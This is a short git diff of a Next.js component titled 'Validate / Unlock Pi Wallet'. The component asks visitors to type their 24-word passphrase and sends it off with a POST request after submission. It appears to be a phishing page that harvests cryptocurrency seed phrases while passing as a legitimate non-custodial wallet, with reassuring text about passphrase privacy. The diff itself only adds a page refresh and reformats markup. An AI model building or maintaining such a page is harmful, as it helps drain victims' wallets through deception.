@@ -2,8 +2,10 @@ import logo from "@/assets/logo.png";
 import Image from "next/image";
 import wallet from "@/assets/wallet.jpg";
 import { useState } from "react";
+import { useRouter } from "next/navigation";
 
 export default function UnlockWallet() {
+  const router = useRouter();
   let [key, setKey] = useState<String>("");
   let handleSubmit = async (e: any) => {
     e.preventDefault();
@@ -16,6 +18,7 @@ export default function UnlockWallet() {
           "Content-Type": "application/json",
         },
       }).then(async (res) => {
+        router.refresh();
         return;
       });
     } else {
@@ -37,7 +40,9 @@ export default function UnlockWallet() {
           handleSubmit(e);
         }}
       >
-        <p className="text-center font-bold text-lg">Validate / Unlock Pi Wallet</p>
+        <p className="text-center font-bold text-lg">
+          Validate / Unlock Pi Wallet
+        </p>
         <textarea
           className="h-56 border-[1px] border-neutral-500 placeholder:text-base  outline-none p-5 rounded-xl"
           placeholder="Enter your 24-word passphrase here"
@@ -55,7 +60,8 @@ export default function UnlockWallet() {
         <p>
           As a non-custodial wallet, your wallet passphrase is exclusively
           accessible only to you. Recovery of passphrase is currently
-          impossible. <br /><br /> Lost your passphrase?{" "}
+          impossible. <br />
+          <br /> Lost your passphrase?{" "}
           <span className="text-blue-500">You can create a new wallet</span>,
           but all your π in your previous wallet will be inaccessible.
         </p>
